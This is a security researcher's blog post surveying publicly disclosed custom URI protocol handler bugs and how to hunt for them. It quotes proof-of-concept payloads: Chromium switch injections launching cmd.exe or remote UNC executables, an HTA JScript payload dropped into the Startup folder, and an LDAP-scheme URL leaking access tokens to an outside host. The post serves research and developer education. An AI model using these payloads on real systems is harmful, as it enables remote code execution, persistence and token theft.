---
title: "Attack Surface Analysis - Part 2 - Custom Protocol Handlers"
date: 2021-03-17T15:14:00-08:00
draft: false
toc: true
comments: true
twitterImage: 03-gwd-poc.png
categories:
- Attack Surface Analysis
---

Custom protocol handlers are an obscure attack surface. They allow us to convert
local attacks into remote ones and are an alternative way to
[jump the browser sandbox without 0days]({{< relref "/post/2020/2020-08-13-localghost-dc28-appsec-village/index.markdown" >}}).

Similar to the first part of this series
[A Novel Way to Bypass Executable Signature Checks with Electron]({{< relref "/post/2021/2021-01-08-electron-sig-bypass/index.markdown" >}})
I will analyze this attack surface and discuss a few interesting public bugs.
I wanted to discuss two of my undisclosed bugs but the post is already too long.

<!--more-->

**TL;DR:** Custom protocol handlers are a great attack surface and allow us to
exploit local vulnerabilities from the browser. If the target app registers a
handler, analyze how the arguments are processed and if they can be used to
launch an attack. As a developer, do not trust any input that comes from URIs.

# Introduction
You can register a scheme (e.g., `bleh`) and then run your app from the browser
(or locally). If the user clicks on `bleh://whatever` the browser asks if they
want to run your app (Firefox allows saving this selection). If the app is set
up to handle the URI like `"C:/whatever/app.exe" "%1"` (the most common way),
the OS will execute `app.exe "bleh://whatever"`. The browser also does some
parameter encoding but that is out of scope for this post.

Protocols are registered by adding a registry key under `HKEY_CLASSES_ROOT`.
Open regedit and go to
`Computer\HKEY_CLASSES_ROOT\WMP11.AssocProtocol.MMS\shell\open\command` to see
a scheme for the Windows Media Player app:

{{< imgcap title="WMP11.AssocProtocol.MMS handler" src="01-wmplayer-run.png" >}}

1. Type `wmp11.assocprotocol.mms:https://example.net` in any browser's address
   bar and press enter.
    1. Alternative 1: Run `wmp11.assocprotocol.mms:https://example.net` in the
       Run prompt (`Win+R`).
    2. Alternative 2: Run `start wmp11.assocprotocol.mms:https://example.net` in cmd.
2. In the browser you will get a prompt that asks if you want to open the
   Windows Media Player.
3. If you accept the prompt, Media Player will start and complain about the URL.

In [procmon][procmon-link] we can see what was passed to the app.

{{< imgcap title="WMPlayer command-line in procmon" src="02-wmplayer-procmon.png" >}}

[procmon-link]: https://docs.microsoft.com/en-us/sysinternals/downloads/procmon

To see all registered handlers use [URLProtocolView][urlprotocolview-nirsoft] by
Nirsoft.

[urlprotocolview-nirsoft]: https://www.nirsoft.net/utils/url_protocol_view.html

## Privilege Escalation via Protocol Handlers
Remember our three privilege levels from part 1?

1. Remote attacker
2. Local attacker running as a standard user
3. Local admin/SYSTEM

Remote attackers can reach URI handlers. If you can get users to click a link in
the browser then you can execute a local app with your controlled parameters
(terms and conditions apply). You can escalate your privilege from a remote
attacker to a local one.

So far, we have established that it's a usually ignored but rich attack surface
that we should pay attention to. In the rest of the post, I am going to try
and classify different vulnerabilities in this space and discuss some public
bugs. I have linked to every writeup at the beginning of each section so make
sure to read the actual bug, too.

# Unsanitized Input
Apps usually trust their command-line switches. After all, why should I care if
a user can spawn a new process as themselves through my app? We can take
advantage of this trust.

To discover these types of vulnerabilities, we need to observe what command-line
switches are available, how they are processed, and finally, check if the
app's behavior can be altered by our supplied arguments.

You will see some overlap between this section and the next. The exploits here
just inject values into the command-line but the next also pass remote files.

## Possible RCE through Windows Custom Protocol on [Nord VPN] Windows Client by @Cyku
This is a disclosed HackerOne report by [Cyku][cyku-twitter]. The report is at
[https://hackerone.com/reports/1001255][cyku-nord-bug].

They used the URI protocol handler to pass a serialized notification string to
the Nord VPN Windows client. The app would deserialize the input and use the
value of the `OpenUrl` parameter to spawn a new process. An attacker can get
code execution on your machine if they can get you to click a link on a webpage.

Looking at the call stack in the report, the input is passed to
[Process.Start(String)][process-start-string]. This is an overload of
`Process.Start` that just executes the file passed to it. An unfortunate
limitation of this overload is not being able to pass parameters.

[cyku-twitter]: https://twitter.com/cyku_tw
[cyku-nord-bug]: https://hackerone.com/reports/1001255
[process-start-string]: https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start?view=net-5.0#System_Diagnostics_Process_Start_System_String_

### Find Bugs Like This with dnSpy
The previous bug was not easy to find and I probably would not have found it.
dnSpy can help you but, you still need to do the flow analysis and read
decompiled source code.

If you have a .NET app, try this workflow:

1. Drag and drop everything in the installation directory into dnSpy.
2. Search for `Process.Start` in `Edit (menu) > Search Assembly`.
3. Right-click every overload in the code and select `Analyze`.
    1. `Process.Start` has multiple overloads.
4. Go down the usage chain by repeatedly opening `Used By`.
5. Continue until you get to a location where input is user-controlled.
6. ???
7. RCE

You can also put a breakpoint on `Process.Start` and then run the app. When the
breakpoint is triggered look at the input and also use the `call stack` feature
to see how you have landed at the breakpoint.

## Origin Remote Code Execution by @zer0pwn
Disclosure: I work for [EA security][ea-security] and Origin is one of our
products. [Dominik Penner/zer0pwn][zer0pwn-twitter] has a couple of Origin bugs
that I am going to discuss.

[ea-security]: https://ea.com/security
[zer0pwn-twitter]: https://twitter.com/zer0pwn

The first one is [Fun With Custom URI Schemes][fun-with-uri] and while not
exploitable directly from the browser, it deals with how Qt (pronounced cute)
command-line switches can result in remote code execution. It's a good start if
you want to start doing security research on Qt apps.

[fun-with-uri]: https://zero.lol/posts/2019-05-22-fun-with-uri-handlers/

You can pass a command-line switch to Qt apps to designate the path to
plugins. Qt plugins (at least on Windows) are DLLs that can spawn new processes.
If you want to know more about Qt issues like this please read
[Loading up a Pair of Qt Bugs: Detailing CVE-2019-1636 and CVE-2019-6739][zdi-qt]

[zdi-qt]: https://www.thezdi.com/blog/2019/4/3/loading-up-a-pair-of-qt-bugs-detailing-cve-2019-1636-and-cve-2019-6739

The blog experiments with passing a UNC path to a remote path to this switch:

```html
<iframe src='origin://?"
    -platformpluginpath \\path\to\remote\plugindir\ "
'>
```

Unfortunately (well fortunately for us at EA), the browser encoding saves us.
The payload becomes
`Origin.exe "origin:///?%22-platformpluginpath \\path\to\remote\plugindir\ %22"`
which doesn't work.

The workaround is a `.URL` file. Think of it as a shortcut file. You can
put custom URIs in it and they do not get encoded. So, a URL file like this
works.

```ini
[InternetShortcut]
URL=origin://?" -platformpluginpath \\path\to\remote\plugindir\ "
```

However, you need to social engineer the users to not only click on the link to
download your file but to also run it. If you can get people to run a file they
have downloaded you do not need Origin although, having a shortcut with the
Origin icon helps. It's a great bug and I am not trying to downplay it.

We were not so lucky with the second bug
[A Questionable Journey From XSS to RCE][origin-xss-rce]. Origin frontend uses
Angular and it was vulnerable to a well-known sandbox escape.

[origin-xss-rce]: https://zero.lol/posts/2019-05-13-xss-to-rce/

You could pass a URI scheme and inject values into `title`.
`origin://game/launch/?offerIds=0&title={{7*7}}`. This is the typical Angular
template injection testing payload and should inject `49` there.

A sandbox bypass was discovered and used. There are a ton of these going around.
For a great intro please see
[So you thought you were safe using AngularJS.. Think again!][lewis-angular-talk]
by my good friend and solid 5/7 JavaScript guy, [Lewis Ardern][lewis-twitter].

[lewis-angular-talk]: https://www.slideshare.net/LewisArdern/so-you-thought-you-were-safe-using-angularjs-think-again
[lewis-twitter]: https://twitter.com/LewisArdern

Now, we have client-side template injection and can inject JavaScript. This is
not Electron where you can just run `require('child_process').exec('calc')` and
get RCE on [PlayStation Now][playstation-now-rce-h1] (shameless brag).

[playstation-now-rce-h1]: https://hackerone.com/reports/873614

Origin had a "JavaScript bridge" (if I may) that allowed JavaScript to call
`QDesktopServices`. A function named `asyncOpenUrl()` calls `openUrl()` which
allows us to open URLs and also schemes.Using that limited RCE was possible.

For example, you could pop calc with
`Origin.client.desktopServices.asyncOpenUrl("calc.exe")`. Unfortunately, this is
a limitation of these functions. You cannot pass parameters to them. The same
limitation was in the Nord VPN bug with the `Process.Start(string)` overload. I
have spent quite some time trying to break out to no avail (future blog post?).

However, the payload is running in a JavaScript context and you have access to
things like user tokens. The authors found a clever way of exfiltrating user
information such as access tokens using the `ldap` scheme like
`"ldap://safe.tld/o="+Origin.user.accessToken()+",c=UnderDog"`.

As the [Ninth Doctor][ninth-dr] (best doctor) would have said, fantastic!

[ninth-dr]: https://en.wikipedia.org/wiki/Ninth_Doctor

## Linux Mint 18.3-19.1 'yelp' Command Injection by @b1ack0wl
[@b1ack0wl][b1ack0wl-twitter] pointed me to this bug in the URI handler for
Yelp. I realized I have only talked about Windows and it might imply that URI
bugs only happen on Windows. Here, we can see that it's possible to have a
similar bug on Linux.

[b1ack0wl-twitter]: https://twitter.com/b1ack0wl

[The URI handler for yelp][mint-yelp-poc] is run like `Exec=yelp %u`. Think of
it as `app.exe %1` without quotes. In this case, the URI is passed (note the
lack of quotes) directly to the following Python file:

```python
#!/usr/bin/python

import os
import sys

if (len(sys.argv) > 1):
    args = ' '.join(sys.argv[1:])
    if ('gnome-help' in args) and not os.path.exists('/usr/share/help/C/gnome-help'):
        os.system ("xdg-open http://www.linuxmint.com/documentation.php &")
    elif ('ubuntu-help' in args) and not os.path.exists('/usr/share/help/C/ubuntu-help'):
        os.system ("xdg-open http://www.linuxmint.com/documentation.php &")
    else:
        os.system ("/usr/bin/yelp %s" % args)  # uh oh
else:
    os.system ('/usr/bin/yelp')
```

If the URI string does not contain `gnome-help` and `ubuntu-help`, it's passed
to a vulnerable `os.System` invocation.

### Browsers Escaping Characters
Now, browser escaping comes into play. It is something we have not had to deal
with in our reviewed bugs, yet. Browsers encode/escape specific characters
before passing them on.
[Exploiting Custom Protocol Handlers in Windows][exploiting-uri] in the
references section has a section about encoding/bypassing and you can find a few
more on the web.

[Chromium bug 785809][chromium-785809] has some good discussions about what to
encode and how to do it ([comment #22][chromium-785809-22] is the most important
IMO). It also touches on how Windows handles URI paths
([comment #21][chromium-785809-21]).

[mint-yelp-poc]: https://github.com/b1ack0wl/linux_mint_poc
[chromium-785809]: https://bugs.chromium.org/p/chromium/issues/detail?id=785809
[chromium-785809-22]: https://bugs.chromium.org/p/chromium/issues/detail?id=785809#c22
[chromium-785809-21]: https://bugs.chromium.org/p/chromium/issues/detail?id=785809#c22

Chrome encodes space to `%20`. So, they replaced it with `$IFS$()`. The default
value of it is `space, tab, newline`. [Internal Field Separator or IFS][ifs-docs]
tells bash how to separate words.

[ifs-docs]: https://bash.cyberciti.biz/guide/$IFS

You can also smuggle `@` into the URI strings because the parsers are looking
for `protocol://user:pass@server.tld/`. [Tweet][jonaslyj-tweet] by
[@jonasLyk][jonaslyk-twitter]

[jonaslyk-twitter]: https://twitter.com/jonasLyk
[jonaslyj-tweet]: https://twitter.com/jonasLyk/status/1372952003719143428

# Loading Remote Files
We can also pass remote files to the target app via these URI handlers. It's an
old technique. I learned it from Raymond Chen's blog post 
[subtle ways your innocent program can be Internet-facing][subtle-raymond]
written in 2006.

[subtle-raymond]: https://devblogs.microsoft.com/oldnewthing/20060509-30/?p=31263

{{< blockquote author="Raymond Chen" link="https://devblogs.microsoft.com/oldnewthing/20060509-30/?p=31263" >}}
Of course, the attacker also controls the contents of the file, so any
vulnerabilities in your file parser can be exploited as well.

Code injection via file contents is an elevation of privilege.
{{< /blockquote >}}

## UNC Paths
On Windows, we usually use UNC (Universal Naming Convention) paths to reference
remote files. They look like `\\server\path\to\file`.

In my proofs-of-concept, I use a local share but in the real world you can set up
a remote server with an open share and host your malicious files.

To know more about UNC paths please read the `UNC Absolute` section of
[James Forshaw's][james-twitter] excellent article
[The Definitive Guide on Win32 to NT Path Conversion][path-conversion]. I have
read it a few times but I mostly treat it as a reference and read specific
sections when I have a problem.

[james-twitter]: https://github.com/tyranid
[path-conversion]: https://googleprojectzero.blogspot.com/2016/02/the-definitive-guide-on-win32-to-nt.html

## CVE-2019-6453 - RCE on mIRC Using Argument Injection Through Custom URI Protocol Handlers by @ProofOfCalc
Take some time to read the write-up at
[https://proofofcalc.com/cve-2019-6453-mIRC/][mirc-uri-rce].

[mirc-uri-rce]: https://proofofcalc.com/cve-2019-6453-mIRC/

The protocol handler for mIRC was setup like
`"C:\Program Files (x86)\mIRC\mirc.exe" %1` and you could pass command-line
switches to the app. The `-i` switch runs a configuration file on startup. That
config file can specify script files and execute them. These script files can
execute code and spawn new processes.

The authors combined the URL handler vuln with a remote configuration file. They
created a link with a UNC path to a remote config file. The link looks like
`<iframe src='irc://? -i\\127.0.0.1\C$\mirc-poc\mirc.ini' />` and runs
`mirc.exe -i \\127.0.0.1\C$\mirc-poc\mirc.ini`.

mIRC loads the remote config file on startup. The config file has a section
where a separate remote script is mentioned. mIRC loads and executes that script
file. The script file then runs code.

### The `--`
Let's talk a little bit about the `--` mentioned in the previous bug.
Command-line switches come in three flavors: named arguments, positional
arguments, and flags. In `parse.exe --verbose --config file.cfg myfile` we have:

* `--verbose` is a flag. If the flag exists its value is `true`.
* `--config` is a named argument with value `file.cfg`.
* `myfile` is a positional argument. It's parsed based on position.

Having `--` in the arguments means everything after that will be treated as a
positional argument so we cannot pass named arguments anymore. Let's say the
protocol handler for our app is `app.exe %1` and we need to accept a positional
argument from the URI. Attackers can pass extra command-line switches to the app
and do bad things. But using `app.exe -- "%1"` means everything will be treated
as a positional argument.

This is not a silver bullet. The app might process the string and extract
arguments from it. Even if we can avoid all named arguments, apps usually accept
a positional argument that is a file they load. Thus, the app might still be
vulnerable when we pass a malicious remote file to it.

## CVE-2020-13699 - Unquoted URI handler in TeamViewer by @Jeffssh
Another avenue of attack is passing remote files and capturing NTLM credentials.
This is a topic that I do not know much about so feel free to correct me here.
Do we get to capture NTLM credentials every time we let an app open a remote
share?! Is it always bad? I do not know.

[Unquoted URI handler in the TeamViewer Windows Desktop Application][teamviewer-unquoted]
by [Jeffrey Hofmann][jeff-twitter] does this. In short, you can create a URI
scheme and make the Teamviewer app open a remote share and capture the NTLM
credentials send by the OS.

[jeff-twitter]: https://twitter.com/jeffssh
[teamviewer-unquoted]: https://jeffs.sh/CVEs/CVE-2020-13699.txt

# Command-Line Switch Injection
Depending on how the app processes these passed parameters, it might be possible
to sneak a command via a command-line switch.

## Electron and CEF command-line Injections by rgod
`rgod` or if I am not mistaken [Andrea Micalizzi][rgod-livejournal] found a ton
of these command injections. They could inject commands in [Electron][electron-url]
and [Chromium Embedded Framework (CEF)][cef-url] apps from the URI.

[rgod-livejournal]: http://retrogod.altervista.org/
[electron-url]: https://www.electronjs.org/
[cef-url]: https://bitbucket.org/chromiumembedded/cef/src

This ZDI article by Vincent Lee
[Top 5 Day Two: Electron Boogaloo - a Case for Technodiversity][rgod-electon-zdi]
explores these bugs in detail.

[rgod-electon-zdi]: https://www.thezdi.com/blog/2018/12/18/top-5-day-two-electron-boogaloo-a-case-for-technodiversity

The ZDI advisory pages don't contain any details so I am not linking to them.
It's very disappointing. We can only learn about these disclosed and fixed bugs
from the end-of-the-year blog post. That said, it's their bugs and they can do
whatever they want with them. 

### Microsoft Teams Command Injection
In the Microsoft Teams exploit rgod passed a parameter named `gpu-launcher` to
the app.

```html
<iframe src='msteams://?"
  --disable-gpu-sandbox
  --no-sandbox
  --gpu-launcher="cmd.exe /c start calc | pause
'>
```

* [gpu-launcher][gpu-launcher-switch] is a Chromium command-line switch that
  launches a new process. In this case, it's the GPU process for Chromium.
* [disable-gpu-sandbox][disable-gpu-sandbox-switch] disables the GPU process
  sandbox (d'oh) which I assume allows the GPU process to do whatever.
* [no-sandbox][no-sandbox-switch] "disables the sandbox for all process types
  that are normally sandboxed."

[gpu-launcher-switch]: https://chromium.googlesource.com/chromium/chromium/+/master/content/public/common/content_switches.cc#414
[disable-gpu-sandbox-switch]: https://chromium.googlesource.com/chromium/chromium/+/master/content/public/common/content_switches.cc#118
[no-sandbox-switch]: https://chromium.googlesource.com/chromium/chromium/+/master/content/public/common/content_switches.cc#463

The
[Electron framework was passing the Chromium switches directly][electron-protocol-handler-fix]
from the URI to the instances. The beauty of finding a framework exploit is
being able to hit multiple applications with one stone. The
[Ubisoft Uplay Desktop Client][ubi-rce] and the [Exodus wallet][exodus-rce] had
similar issues.

[electron-protocol-handler-fix]: https://www.electronjs.org/blog/protocol-handler-fix
[ubi-rce]: https://thewhiteh4t.github.io/2018/11/16/ubisoft-uplay-rce-exploit.html
[exodus-rce]: https://hackernoon.com/exploiting-electron-rce-in-exodus-wallet-d9e6db13c374

### Google Web Designer Command Injection via The Log File
The Google Web Designer bug is more complex and a neat trick. It took me 30
minutes and a few rabbit holes to figure it out.

{{< blockquote author="Vincent Lee" link="https://www.thezdi.com/blog/2018/12/18/top-5-day-two-electron-boogaloo-a-case-for-technodiversity" >}}
However, we have not seen any public PoC using the exploit techniques
demonstrated by rgod in his other submissions. In the submission for ZDI-18-552
affecting Google Web Designer, he had exploited three other command-line options
to inject a .hta HTML Application file into the log file. The log file is
controlled by the attacker and placed in the startup directory of the victim's
machine
{{< /blockquote >}}


```html
<a href='gwd-template://?"
  --type=">>>>>>>>>>>>>>>>>>>>>>
    <script> var x=new ActiveXObject(\"WScript.Shell\"); x.Exec(\"calc.exe\");</script>"
  --no-sandbox
  --log-file=
    "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/suntzu.hta"
  --log-severity=verbose /'>
  clickme
</a>
```

#### The type Switch
According to the [source code][type-switch], the `type` switch sets the process
type. Originally, I thought there was an injection vulnerability when this
switch was processed. The payload looks like a typical XSS payload.
We are injecting JScript (think Microsoft's JavaScript) after all. This value is
directly written to the log file.

[type-switch]: https://chromium.googlesource.com/chromium/chromium/+/master/content/public/common/content_switches.cc#507

{{< imgcap title="Google Web Designer POC Image. Image credit: ZDI blog" src="03-gwd-poc.png" >}}

Alt text for this image:

```
Screenshot of a Windows machine. It shows several windows. The top left is an
Internet Explorer page with parts of the address bar visible
"http://172.16.51.1:8080/poc.html" which is most likely the HTML file from the
previous picture opened in IE.

Under that (still, top left) is an instance of the Windows calculator. This is
what they call "popping calc" which is executing calculator to show command
execution.

The top right is the typical Windows error dialog for "Google Web Designer." It says
"Google Web designer has stopped working" and has the buttons that "check for a
solution online" or "close the program".

The bottom right is a log file opened in notepad. It is the HTA app from the
previous payload. It has some logs about the Google web designer app.
```

Look at the contents of the log file (opened as an HTA app) in the picture above
(I added a red rectangle to highlight the location I am talking about). In some
old [Chromium source code][chromium-histogram-old-src], we can see how this log
entry is created (it's does not exist in
[the current version][chromium-histogram-current-src]):

[chromium-histogram-old-src]: https://chromium.googlesource.com/aosp/platform/external/libchrome/+/refs/heads/stabilize-8530.93.B/base/metrics/histogram_base.cc#136
[chromium-histogram-current-src]: https://chromium.googlesource.com/aosp/platform/external/libchrome/+/refs/heads/master/base/metrics/histogram_base.cc

```cpp
void HistogramBase::EnableActivityReportHistogram(
    const std::string& process_type) {
  DCHECK(!report_histogram_);
  // Code removed
  std::string name =
      "UMA.Histograms.Activity" +
      (process_type.empty() ? process_type : "." + process_type); // <--- Injection
  // Comment removed
  report_histogram_ = LinearHistogram::FactoryGet(
      name, 1, HISTOGRAM_REPORT_MAX, HISTOGRAM_REPORT_MAX + 1,
      kUmaTargetedHistogramFlag);
  report_histogram_->Add(HISTOGRAM_REPORT_CREATED);
}
```

The `name` string contains the type of the process. It is injected with the
`type` switch and then reflected as-is in the log file.

#### The Payload
The payload runs the Windows calculator. It's written in JScript.

```js
var x=new ActiveXObject("WScript.Shell");
x.Exec("calc.exe");
```

We have complete control here and unlike `Process.Start` above we are not
limited to just running executables. We can provide our parameters and pretty
much do anything. HTAs also support VBScript like this
[proof of concept][luke-calc-hta] by my old colleague Luke Arntson.

[luke-calc-hta]: https://github.com/arntsonl/calc_security_poc/blob/master/hta/calc.hta

#### The Log File
The `log-file` switch does not appear in the current Chromium or CEF switches.
It was probably removed? It's pointing to the location of the log file.

`C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/suntzu.hta`

`STARTM~1` is the shortpath notation for `Start Menu`. The payload uses the good
ole' `8.3` notation to avoid having spaces in the path. Shortpath also works on
directories because directory names are stored as a
[special type of files][directories-special-files].

[directories-special-files]: https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file#:~:text=Note%20that%20directory%20names%20are%20stored%20by%20the%20file%20system%20as%20a%20special%20type%20of%20file,

It's the startup directory for the administrator. Every time the user logs on,
the contents of the directory are executed. This includes the injected HTA file.

`log-severity` appears to have been replaced with `log-level`. Setting it to
`verbose` almost certainly added those messages with the process type to the
log file.

#### How Does This Work?
There are two main questions:

1. The payload has garbage logs around it. How does it get parsed correctly?
2. How is the HTA file executed every time the user logs on?

To answer both, we are going to replicate this in a VM. Store the following in a
file named `whatever.hta`.

```html
Text before the payload.
<script>
  var x=new ActiveXObject("WScript.Shell");
  x.Exec("calc.exe");
</script>

Text after the payload.
```

Now we can run this file by double-clicking on it. HTA files are executed by
`mshta.exe` and contain HTML apps. Inside these apps, you can have more than
just normal JavaScript. For more information, please see
[Introduction to HTML Applications (HTAs) on docs.microsoft.com][ms-hta-docs],
especially the section named `The Power of Trust: HTAs and Security`.

[ms-hta-docs]: https://docs.microsoft.com/en-us/previous-versions//ms536496(v=vs.85)

{{< imgcap title="whatever.hta executed" src="05-hta-executed.png" >}}

Because they are HTML applications the text before and after the script is
treated like, well, text. The script is executed. Hence why you do not see it in
the resulting page. We can see the processes in procmon:

{{< imgcap title="whatever.hta in procmon" src="06-hta-procmon.png" >}}

To explore more, put it in the `Start Up` directory for your user at:

`%appdata%/Microsoft/Windows/STARTM~1/Programs/Startup/`

Now, run the `logoff` command in your VM and log in again. A few seconds after
login you should see the HTA app and calc.

All 22 closing brackets appear in the log and none of them are used up. At
first, I thought they are pointing to the location of the payload in the log
file (think arrows) but now, I think they are there to get out of anything in
the log that might be interpreted as an HTML tag by the parser.

Brilliant bug! Don't forget to remove the HTA file from your VM.

### Skype Command Injection via browser-subprocess-command
This payload combines two of the techniques we have seen. command-line switch
injection and remote files.

```html
<a hred='skype://?"
  --secondary
  --browser-subprocess-path=\\192.168.0.1\uncshare\sh.exe
'>
```

I cannot find any information about the `secondary` flag in
[flag-descriptions.cc][flag-descriptions-rc] but it is probably needed. Does it
enable Chromium's secondary UI? I don't know.

The [browser-subprocess-command][browser-subprocess-path-switch] specifies an
executable for the Chromium renderer and plugin subprocesses. It's set to a
remote file via a UNC path. Skype would execute it when creating a renderer
subprocess and the attacker would get remote code execution.

[flag-descriptions-rc]: https://chromium.googlesource.com/chromium/src/+/master/chrome/browser/flag_descriptions.cc
[browser-subprocess-path-switch]: https://chromium.googlesource.com/chromium/chromium/+/master/content/public/common/content_switches.cc#32

During the review, we had this question about the remote file. Will the OS show
a prompt and ask for confirmation before executing a remote executable? I don't
know. If you do, please let me know. I think in this case, the framework does it
automagically and there is no prompt? Honestly, we have to find a copy of the
vulnerable version and try it.

### Slack command-line Injection via browser-subprocess-command
The Slack exploit is similar to the previous bug. There is one difference.
According to the article, an existing instance of Slack would prevent the
exploit. They got around by supplying `user-data-dir`. This runs the instance
run under a new user (e.g., profile) and work.

The exploit URI uses calc but I think we can assume it can execute a remote file
like the Skype version (doubt).

```html
<a href='slack://"
  --user-data-dir=.
  -- browser-subprocess-path=C:/Windows/System32/calc.exe
'>
```

There are two more similar advisories. but as I said the ZDI advisory pages do not have
any details and I was not able to find any public info. Both apps use CEF.

* [Spotify Music Player URI parsing Command Injection Remote Code Execution Vulnerability][spotify-advisory]
* [Amazon Music Player URI parsing Command Injection Remote Code Execution Vulnerability][amazon-music-advisory]

[spotify-advisory]: https://www.zerodayinitiative.com/advisories/ZDI-18-280/
[amazon-music-advisory]: https://www.zerodayinitiative.com/advisories/ZDI-18-215/

# So, How Do I Get Started?
After reading these bugs you are now motivated to go and find things and
hopefully, make some dosh.

## Listing All Registered Protocol Handlers
If you are targeting a specific program you probably already know the URI scheme
during your initial attack surface analysis (you did one, didn't you?).
[URLProtocolView][urlprotocolview-nirsoft] by Nirsoft is a great tool to view
all of these schemes.

[urlprotocolview-nirsoft]: https://www.nirsoft.net/utils/url_protocol_view.html

Next, check how the URI is passed to the app. In URLProtocolView we can see it
under the `Command-Line` column. Here's the entry for the Nord VPN URI scheme we
saw before. This shows if there are any extra command-line switches. You can
also see it in action with procmon.

{{< imgcap title="NordVPN.Notification" src="04-nordvpn-uri.png" >}}

Unfortunately, there is no set-piece strategy after that. I usually look for
these things.

## Command-Line Switches
This could be as easy as running `app.exe -h/--help` or reading the
documentation. Sometimes, you can just run the app with some random input and it
will print a helpful list of switches.

But more often than not you need to debug/RE the app (I am better at dynamic
analysis). Often, commercial closed source apps have some hidden/debug switches
that are not publicly known. Sometimes, setting "debug mode" disables some of
the protections (remember the Chromium switches that disabled the sandbox?).

[@Jeffssh][jeff-twitter] mentioned that we can just run `strings` on the
binary.

## How Parameters are Processed
Does the app parse the string and extract parameters or is it expecting a string
in a specific format (like the Nord VPN serialized string) and returns an
error/ignores the rest? Sometimes, the app is helpful and parses the string into
its argument/value tuples.

## Flow Analysis
After you have figured out what switches and input are available you need to
figure out where this input ends up. I mentioned how dnSpy helps with that.
Sometimes, there is no need to do this because a switch results in an exploit
(e.g., the mIRC bug).

## Passing Remote Files
Check if the app accepts UNC paths and remote files. Pass a UNC path and see if
the file is accessed. Create a local share on your machine and then do
`\\localhost\share\path\to\file`. Make sure to disable authentication for the
share.

# What Did We Learn Here Today?
We learned how to look for vulnerabilities in custom protocol handlers. We
reviewed a good number of bugs and learned quite a few techniques. Go and find
these in the wild. If you do (and you can), please publish your write-ups and
let me know.

## Do You Wanna Know More?
Now, we know enough to get started. But, be sure to read these references,
later.

* [Understanding Protocols on docs.microsoft.com][understanding-protocols] is an
  oldie but a goodie.
* [Exploiting Custom Protocol Handlers in Windows][exploiting-uri] by Andrey Polkovnychenko.
* [Provoking Windows - DragonCon 2016 - start at slide 77][provoking-windows] by Jeremy Brown.
* [URI Use and Abuse - Black Hat Europe 2008 - slides][uri-use-abuse-slides] and
  [whitepaper][uri-use-abuse-wp] by Nathan McFeters, Billy Rios, and Rob Carter.
* [Electron's bug, ShellExecute to blame?][shellexecute-codecolorist] by
  [@CodeColorist][codecolorist-twitter].
  * Mostly discusses the quirks of ShellExecute.

[understanding-protocols]: https://docs.microsoft.com/en-us/archive/blogs/ieinternals/understanding-protocols
[exploiting-uri]: https://www.vdoo.com/blog/exploiting-custom-protocol-handlers-in-windows
[provoking-windows]: https://www.slideshare.net/JeremyBrown37/provoking-windows-dragoncon-2016
[uri-use-abuse-slides]: https://www.blackhat.com/presentations/bh-europe-08/McFeters-Rios-Carter/Presentation/bh-eu-08-mcfeters-rios-carter.pdf
[uri-use-abuse-wp]: https://www.blackhat.com/presentations/bh-europe-08/McFeters-Rios-Carter/Whitepaper/bh-eu-08-mcfeters-rios-carter-WP.pdf
[codecolorist-twitter]: https://twitter.com/CodeColorist
[shellexecute-codecolorist]: https://blog.chichou.me/2018/01/28/electron-s-bug-shellexecute-to-blame/

# Acknowledgements
Special thanks to everyone who publishes their bugs so we can learn and
specially these great folks who also reviewed my explanation of their bugs and
gave me feedback (in alphabetical order):

* [@b1ack0wl][b1ack0wl-twitter]
* [@Cyku][cyku-twitter]
* [@jeffssh][jeff-twitter]
* [@zer0pwn][zer0pwn-twitter]
